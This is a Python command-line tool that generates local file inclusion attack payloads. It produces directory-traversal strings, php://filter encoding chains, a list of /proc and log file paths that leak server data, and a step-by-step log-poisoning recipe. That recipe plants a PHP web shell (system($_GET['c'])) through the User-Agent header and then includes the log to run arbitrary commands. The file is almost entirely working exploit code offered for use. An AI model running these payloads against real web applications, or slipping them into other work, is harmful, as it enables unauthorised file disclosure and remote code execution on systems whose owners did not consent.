#!/usr/bin/env python3
"""lfi_payloads.py — generate LFI exploitation payloads: path traversal,
PHP filter chains, /proc cribs, and log-poisoning helpers.

Usage
-----
    python lfi_payloads.py traversal <target> [--max-depth N]
    python lfi_payloads.py filter    <target>
    python lfi_payloads.py proc
    python lfi_payloads.py log       <log-path> [--php '<?php ... ?>']

Outputs one payload per line, suitable for piping into ffuf / curl loops.
"""
from __future__ import annotations

import argparse


def traversal(target: str, max_depth: int = 15) -> list[str]:
    """Return ``['../' + target, '../../' + target, ...]`` up to ``max_depth``."""
    target = target.lstrip("/")
    return ["../" * d + target for d in range(1, max_depth + 1)]


DEFAULT_FILTERS = [
    "convert.base64-encode",
    "convert.iconv.utf-8.utf-16le",
    "convert.iconv.utf-8.utf-7",
    "zlib.deflate",
    "string.rot13",
    "string.toupper",
]


def php_filter(target: str, encodings: list[str] | None = None) -> list[str]:
    """Return ``php://filter`` chains around ``target`` for each encoding."""
    encs = encodings or DEFAULT_FILTERS
    return [f"php://filter/{enc}/resource={target}" for enc in encs]


def proc_cribs() -> list[str]:
    """Return useful /proc paths that often leak useful data through LFI."""
    return [
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/maps",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/self/root/etc/passwd",
        "/proc/self/cwd/index.php",
        "/proc/version",
        "/proc/cmdline",
        "/proc/mounts",
    ]


DEFAULT_LOG_PATHS = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/httpd/access_log",
    "/var/log/auth.log",
    "/var/log/mail.log",
    "/var/log/vsftpd.log",
]


def log_poison_payload(log_path: str, php: str = "<?php system($_GET['c']); ?>") -> dict:
    """Return a recipe dict for User-Agent based log poisoning. The PHP
    payload is what gets injected via a request header (typically
    User-Agent), then ``then_include`` is the LFI parameter value to fetch
    the log and execute the payload."""
    return {
        "header_to_inject": "User-Agent",
        "php_payload": php,
        "then_include": log_path,
        "notes": (
            "1) Send any HTTP request with User-Agent: " + php + "  "
            "2) Trigger LFI with path=" + log_path + "&c=<cmd>  "
            "3) The web server logs the UA, the LFI includes the log, "
            "PHP executes the payload."
        ),
    }


def main() -> None:
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)

    t = sub.add_parser("traversal")
    t.add_argument("target")
    t.add_argument("--max-depth", type=int, default=15)

    f = sub.add_parser("filter")
    f.add_argument("target")

    sub.add_parser("proc")

    lg = sub.add_parser("log")
    lg.add_argument("log_path", nargs="?", help="path to access log (omit to list common paths)")
    lg.add_argument("--php", default="<?php system($_GET['c']); ?>")

    args = ap.parse_args()

    if args.cmd == "traversal":
        for p in traversal(args.target, args.max_depth):
            print(p)
    elif args.cmd == "filter":
        for p in php_filter(args.target):
            print(p)
    elif args.cmd == "proc":
        for p in proc_cribs():
            print(p)
    elif args.cmd == "log":
        if args.log_path:
            rec = log_poison_payload(args.log_path, args.php)
            for k, v in rec.items():
                print(f"{k}: {v}")
        else:
            print("# common log paths:")
            for p in DEFAULT_LOG_PATHS:
                print(p)


if __name__ == "__main__":
    main()
